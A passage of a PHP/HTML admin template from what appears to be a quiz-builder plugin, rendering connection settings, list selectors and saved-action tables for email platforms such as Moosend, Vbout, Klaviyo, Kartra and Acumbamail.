									 <div class="form-group form-row "> 
										 
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
																
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$sendfox_list_name = '';
															
															if(isset($sendfox_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$sendfox_list_name = $sendfox_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															


															$table_body .= '<td class="automation_action_data">'.$sendfox_list_name.'</td>';
															
															
															
															
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>
										
									
								</div>
								
								
								
								
								
							</li>
							
							<li>
								
								
								<?php 
								 
									 
									
									$autoresponder_name = 'MOOSEND';
									$moosendObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$moosend_api_key = '';
								
									$moosend_connect_text = 'Click Here to Connect';
									$moosend_connect_class = "";
									$moosend_show_list = 'display:none';
									$moosend_show_connect_btn = 'display:none';
									if(in_array('MOOSEND',$user_added_plateform_array)){ 
										$moosend_show_connect_btn = '';
									}
									
										
									$moosend_select_list = '<select class="automation_select1 add_to_value_moosend" id="add_to_value1" style="display:none;">';
										$moosend_select_list .= '<option value="">Select List</option>';

									$moosend_select_list .= '</select>';
									
									
									
									$moosend_lists_sort_by_id = array();
									 $autoresponder_details_obj = array();
									if(is_array($moosendObj)  && count($moosendObj)){
										
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										
										
										$moosend_connect_text = "Connected";
										$moosend_connect_class = "  btn-success ";
										$moosend_show_list = '';
										$moosend_show_connect_btn = '';
									
										
										if(isset($moosendObj['api_key'])){
											$moosend_api_key = $moosendObj['api_key'];
										}
										if(isset($moosendObj['lists'])){
												$moosend_select_list = $moosendObj['lists'];
										}
										if(isset($moosendObj['lists_sort_by_id'])){
												$moosend_lists_sort_by_id = $moosendObj['lists_sort_by_id'];
										}
										
										
										
										
									}
									if(!in_array('MOOSEND',$user_added_plateform_array)){ 
										$moosend_show_list = 'display:none';
									}
										
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="MOOSEND" class="custom-checkbox-input" <?php if(in_array('MOOSEND',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>MOOSEND</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $moosend_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_moosend_modal" style="<?php echo $moosend_show_connect_btn; ?>"><?php echo $moosend_connect_text; ?> </button>

								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('MOOSEND',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags.</p>
										<p>However, MoonSend APIs do not support tags. So SQB will not be able to send tags to MoonSend.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer moosend_save_outer_div" style="<?php echo $moosend_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="automation_select1 add_to_id_moosend" id="add_to_id1">
											<option value="">Select Action</option>
											<option value="A:list" selected= 'selected' >Add To List</option> 
											
											
										</select>
									  </div>
									  
								 	<?php echo $all_outcome; ?>
									<div class='sqb_select_list_outer col-sm-2'><?php echo $moosend_select_list; ?></div>
									 
									  
										  
									  <div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="moosend">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="moosend" style="display:none">Add More </a>
											
										</div>  
									  
									  
									  
								   </div>
								  
									
									 <div class="form-group form-row "> 
										 
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$moosend_list_name = '';
															
															if(isset($moosend_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$moosend_list_name = $moosend_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															


															$table_body .= '<td class="automation_action_data">'.$moosend_list_name.'</td>';
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>
									
										
								</div>
								
								
								
								
								
							</li>
							<li>
								
								
								<?php 
								 
									 
									
									$autoresponder_name = 'VBOUT';
									$vboutObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$vbout_api_key = '';
								
									$vbout_connect_text = 'Click Here to Connect';
									$vbout_connect_class = "";
									$vbout_show_list = 'display:none';
									$vbout_show_connect_btn = 'display:none';
									if(in_array('VBOUT',$user_added_plateform_array)){ 
										$vbout_show_connect_btn = '';
									}
									
										
									$vbout_select_list = '<select class="automation_select1 add_to_value_vbout" id="add_to_value1" style="display:none;">';
										$vbout_select_list .= '<option value="">Select List</option>';

									$vbout_select_list .= '</select>';
									
									
									
									$vbout_lists_sort_by_id = array();
									$autoresponder_details_obj = array();
									if(is_array($vboutObj)  && count($vboutObj)){
										
										
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										
										$vbout_connect_text = "Connected";
										$vbout_connect_class = "  btn-success ";
										$vbout_show_list = '';
										$vbout_show_connect_btn = '';
									
										
										if(isset($vboutObj['api_key'])){
											$vbout_api_key = $vboutObj['api_key'];
										}
										if(isset($vboutObj['lists'])){
												$vbout_select_list = $vboutObj['lists'];
										}
										if(isset($vboutObj['lists_sort_by_id'])){
												$vbout_lists_sort_by_id = $vboutObj['lists_sort_by_id'];
										}
										
										
										
										
									}
									if(!in_array('VBOUT',$user_added_plateform_array)){ 
										$vbout_show_list = 'display:none';
									}
										
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="VBOUT" class="custom-checkbox-input" <?php if(in_array('VBOUT',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>VBOUT</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $vbout_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_vbout_modal" style="<?php echo $vbout_show_connect_btn; ?>"><?php echo $vbout_connect_text; ?> </button>

								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('VBOUT',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags.</p>
										<p>SQB will automatically send it to Vbout.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer vbout_save_outer_div" style="<?php echo $vbout_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="automation_select1 add_to_id_vbout" id="add_to_id1">
											<option value="">Select Action</option>
											<option value="A:list" selected= 'selected' >Add To List</option> 
											
											
										</select>
									  </div>
									  
								 	<?php echo $all_outcome; ?>
									<div class='sqb_select_list_outer col-sm-2'><?php echo $vbout_select_list; ?></div>
									 
									  
										  
									  <div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="vbout">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="vbout" style="display:none">Add More </a>
											
										</div>  
									  
									  
									  
								   </div>
								  
									
									 <div class="form-group form-row "> 
										 
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$vbout_list_name = '';
															
															if(isset($vbout_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$vbout_list_name = $vbout_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															


															$table_body .= '<td class="automation_action_data">'.$vbout_list_name.'</td>';
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>
									
										

								</div>
								
								
								
								
								
							</li>
							<li>
								
								
								<?php 
								 
									 
									
									$autoresponder_name = 'KLAVIYO';
									$klaviyoObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$klaviyo_api_key = '';
								
									$klaviyo_connect_text = 'Click Here to Connect';
									$klaviyo_connect_class = "";
									$klaviyo_show_list = 'display:none';
									$klaviyo_show_connect_btn = 'display:none';
									if(in_array('KLAVIYO',$user_added_plateform_array)){ 
										$klaviyo_show_connect_btn = '';
									}
									
										
									$klaviyo_select_list = '<select class="automation_select1 add_to_value_klaviyo" id="add_to_value1" style="display:none;">';
										$klaviyo_select_list .= '<option value="">Select List</option>';

									$klaviyo_select_list .= '</select>';
									
									
									
									$klaviyo_lists_sort_by_id = array();
									 $autoresponder_details_obj = array();
									if(is_array($klaviyoObj)  && count($klaviyoObj)){
										
										
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										
										$klaviyo_connect_text = "Connected";
										$klaviyo_connect_class = "  btn-success ";
										$klaviyo_show_list = '';
										$klaviyo_show_connect_btn = '';
									
										
										if(isset($klaviyoObj['api_key'])){
											$klaviyo_api_key = $klaviyoObj['api_key'];
										}
										if(isset($klaviyoObj['lists'])){
												$klaviyo_select_list = $klaviyoObj['lists'];
										}
										if(isset($klaviyoObj['lists_sort_by_id'])){
												$klaviyo_lists_sort_by_id = $klaviyoObj['lists_sort_by_id'];
										}
										
										
										
										
									}
									if(!in_array('KLAVIYO',$user_added_plateform_array)){ 
										$klaviyo_show_list = 'display:none';
									}
										
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="KLAVIYO" class="custom-checkbox-input" <?php if(in_array('KLAVIYO',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>KLAVIYO</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $klaviyo_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_klaviyo_modal" style="<?php echo $klaviyo_show_connect_btn; ?>"><?php echo $klaviyo_connect_text; ?> </button>

								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('KLAVIYO',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags.</p>
										<p>However, Klaviyo APIs do not support tags. So SQB will not be able to send tags to Klaviyo.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer klaviyo_save_outer_div" style="<?php echo $klaviyo_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="automation_select1 add_to_id_klaviyo" id="add_to_id1">
											<option value="">Select Action</option>
											<option value="A:list" selected= 'selected' >Add To List</option> 
											
											
										</select>
									  </div>
									  
									 <?php echo $all_outcome; ?>
									<div class='sqb_select_list_outer col-sm-2'><?php echo $klaviyo_select_list; ?></div>
									 
									  
										  
									  <div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="klaviyo">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="klaviyo" style="display:none">Add More </a>
											
										</div>  
									  
									  
									  
								   </div>
								  
									
									 <div class="form-group form-row "> 
										 
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													$klaviyo_list_name = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															
															if(isset($klaviyo_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$klaviyo_list_name = $klaviyo_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															


															$table_body .= '<td class="automation_action_data">'.$klaviyo_list_name.'</td>';
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>
									
										
									
								</div>
								
								
								
								
								
							</li>
							

							<li>
								
								
								<?php 
								 
									 
									
									$autoresponder_name = 'KARTRA';
									$kartraObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$kartra_api_id = '';
									$kartra_api_key = '';
									$kartra_api_password = '';
								
									$kartra_connect_text = 'Click Here to Connect';
									$kartra_connect_class = "";
									$kartra_show_list = 'display:none';
									$kartra_show_connect_btn = 'display:none';
									if(in_array('KARTRA',$user_added_plateform_array)){ 
										$kartra_show_connect_btn = '';
									}
									
										
									$kartra_select_list = '<select class="automation_select1 add_to_value_kartra" id="add_to_value1" style="display:none;">';
										$kartra_select_list .= '<option value="">Select List</option>';

									$kartra_select_list .= '</select>';
									
									
									
									$kartra_lists_sort_by_id = array();
									 $autoresponder_details_obj = array();
									if(is_array($kartraObj)  && count($kartraObj)){
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										$kartra_connect_text = "Connected";
										$kartra_connect_class = "  btn-success ";
										$kartra_show_list = '';
										$kartra_show_connect_btn = '';
									
										
										if(isset($kartraObj['api_id'])){
											$kartra_api_id = $kartraObj['api_id'];
										}

										if(isset($kartraObj['api_key'])){
											$kartra_api_key = $kartraObj['api_key'];
										}

										if(isset($kartraObj['api_password'])){
											$kartra_api_password = $kartraObj['api_password'];
										}
										if(isset($kartraObj['lists'])){
												$kartra_select_list = $kartraObj['lists'];
										}
										if(isset($kartraObj['lists_sort_by_id'])){
												$kartra_lists_sort_by_id = $kartraObj['lists_sort_by_id'];
										}
										
										
										
										
									}
									if(!in_array('KARTRA',$user_added_plateform_array)){ 
										$kartra_show_list = 'display:none';
									}
										
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="KARTRA" class="custom-checkbox-input" <?php if(in_array('KARTRA',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>KARTRA</span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $kartra_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_kartra_modal" style="<?php echo $kartra_show_connect_btn; ?>"><?php echo $kartra_connect_text; ?> </button>
								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('KARTRA',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>First you need to create same name "tags" in Kartra.</p>
										<p>Then SQB will send it to Kartra.</p>
									</div>
								</div>

								<div class="autoresonder_details_fields_outer kartra_save_outer_div" style="<?php echo $kartra_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="automation_select1 add_to_id_kartra" id="add_to_id1">
											<option value="">Select Action</option>
											<option value="A:list" selected= 'selected' >Add To List</option> 
											<option value="R:ListId">Remove From List</option>
											
											
										</select>
									  </div>
									  
								 	<?php echo $all_outcome; ?>
									<div class='sqb_select_list_outer col-sm-2'><?php echo $kartra_select_list; ?></div>
									 
									  
										  
									  <div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="kartra">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="kartra" style="display:none">Add More </a>
											
										</div>  
									  
									  
									  
								   </div>
								  
									
									 <div class="form-group form-row "> 
										 
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$kartra_list_name = '';
															
															if(isset($kartra_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$klaviyo_list_name = $kartra_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															


															$table_body .= '<td class="automation_action_data">'.$klaviyo_list_name.'</td>';
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>
									
										
									
								</div>
								
								
								
								
								
							</li>

							<li>
								
								
								<?php 
								 
									 
									
									$autoresponder_name = 'ACUMBAMAIL';
									$acumbamailObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
									$acumbamail_auth_token = '';
								
									$acumbamail_connect_text = 'Click Here to Connect';
									$acumbamail_connect_class = "";
									$acumbamail_show_list = 'display:none';
									$acumbamail_show_connect_btn = 'display:none';
									if(in_array('ACUMBAMAIL',$user_added_plateform_array)){ 
										$acumbamail_show_connect_btn = '';
									}
									
										
									$acumbamail_select_list = '<select class="automation_select1 add_to_value_acumbamail" id="add_to_value1" style="display:none;">';
										$acumbamail_select_list .= '<option value="">Select List</option>';

									$acumbamail_select_list .= '</select>';
									
									
									
									$acumbamail_lists_sort_by_id = array();
									 $autoresponder_details_obj = array();
									if(is_array($acumbamailObj)  && count($acumbamailObj)){
										
										$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
										
										
										$acumbamail_connect_text = "Connected";
										$acumbamail_connect_class = "  btn-success ";
										$acumbamail_show_list = '';
										$acumbamail_show_connect_btn = '';
									
										
										if(isset($acumbamailObj['api_key'])){
											$acumbamail_auth_token = $acumbamailObj['api_key'];
										}
										if(isset($acumbamailObj['lists'])){
												$acumbamail_select_list = $acumbamailObj['lists'];
										}
										if(isset($acumbamailObj['lists_sort_by_id'])){
												$acumbamail_lists_sort_by_id = $acumbamailObj['lists_sort_by_id'];
										}
										
										
										
										
									}
									if(!in_array('ACUMBAMAIL',$user_added_plateform_array)){ 
										$acumbamail_show_list = 'display:none';
									}
										
									?>		
								
								<div class="add_user_in_your_email_platform_inner">
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_in_your_email_platform" value="ACUMBAMAIL" class="custom-checkbox-input" <?php if(in_array('ACUMBAMAIL',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>
									<span class="custom--checkbox"></span>
								</span>
								<span>ACUMBAMAIL <div class="tool-tip">
										<i class="fa fa-info-circle" aria-hidden="true"></i>
										<div class="toll-tip-desc">To send tags, create a field in Acumbamail called "tag", and then enter the tag name in the SQB >> outcome tab.</div>
									</div></span>
								</div>
								<button type="button" class="btn btn-primary checkeck_email_has <?php echo $acumbamail_connect_class;?>" data-toggle="modal" data-target="#user_add_my_email_plateform_acumbamail_modal" style="<?php echo $acumbamail_show_connect_btn; ?>"><?php echo $acumbamail_connect_text; ?> </button>
								<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('ACUMBAMAIL',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>You can set different tags for each outcome in the outcome screen by clicking on Outcome Tags. You can also assign answer level tags. First you need to create a custom field called "tag" in Acumbamail and store the assigned tags (comma-separated if more than one), in this custom field.</p>	
									</div>
								</div>
								<div class="autoresonder_details_fields_outer acumbamail_save_outer_div" style="<?php echo $acumbamail_show_list; ?>">
								   <div class="form-group form-row ">
									  <div class="col-sm-2">
										 <select class="automation_select1 add_to_id_acumbamail" id="add_to_id1">
											<option value="">Select Action</option>
											<option value="A:list" selected= 'selected' >Add To List</option> 
											
											
										</select>
									  </div>
									  
								 	<?php echo $all_outcome; ?>
									<div class='sqb_select_list_outer col-sm-2'><?php echo $acumbamail_select_list; ?></div>
									 
									  
										  
									  <div class="col-sm-3">
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary automation_action_btn add_action_btn btn btn btn-primary sqb_ep_click_to_save_btn" type="button" data-action="acumbamail">Click to Save</a>
											<a href="javascript:void(0)" class="automation_action_btn add_action_btn btn btn btn-primary " type="button" data-action="acumbamail" style="display:none">Add More </a>
											
										</div>  
									  
									  
									  
								   </div>
								  
									
									 <div class="form-group form-row "> 
										
											<div class="table-responsive autoresponder_table_details <?php echo strtolower($autoresponder_name);?>" style ="<?php  if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)  != 0){}else{ echo 'display:none';} ?>">
												<table  class="table table-bordered autoresponder_table_class autoresponder_table_class">
													<thead>
													 <tr>
															<th>Action</th>
															<th class="autoresponder_outcome_data" <?php echo $hide_email_based_options; ?>>Outcome</th>
															<th>List Name</th>
															
															<th class="text-center">Action</th>
														  </tr>
														  
													</thead>
													<tbody>
													<?php 
													$table_body = '';
													if(isset($autoresponder_details_obj) && count($autoresponder_details_obj)){
														foreach($autoresponder_details_obj as $autoresponder_details){
															
															$table_body_tr_class = '  table_tr_id_'.$autoresponder_details->getId();
															$table_body .= '<tr class="'.$table_body_tr_class.'">';
															$table_body .= '<td>'.ucwords($autoresponder_details->getAction()).'</td>';
															if($autoresponder_details->getOutcomeId()){
																$sqboutcomedata = SQB_Outcome::loadById($autoresponder_details->getOutcomeId());
																if(!empty($sqboutcomedata)){
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'>'.$sqboutcomedata->getOutcomeName().'</td>';
																}else{
																	$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
																}
															}else{
																$table_body .= '<td class="autoresponder_outcome_data" '.$hide_email_based_options.'></td>';
															}
															$acumbamail_list_name = '';
															
															if(isset($acumbamail_lists_sort_by_id[$autoresponder_details->getActionId()])){
																$acumbamail_list_name = $acumbamail_lists_sort_by_id[$autoresponder_details->getActionId()];
															}    

															


															$table_body .= '<td class="automation_action_data">'.$acumbamail_list_name.'</td>';
															
															$table_body .= '<td class="text-center delete_autoresponder_td"><i class="fa fa-trash" aria-hidden="true" onclick="sqb_autoresponder_delete_by_id('.$autoresponder_details->getId().')"></i></td>';
															$table_body .= '</tr>';
															
														}
													}
													echo $table_body;
													?>	
														 
													</tbody> 
													</table>
											</div>
										</div>
									
										
								</div>
								
								
								
								
								
							</li>
	
								
								<li>
								
								<?php 
								 
									 
									
									$autoresponder_name = 'HUBSPOT';
									$hubspotObj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
									
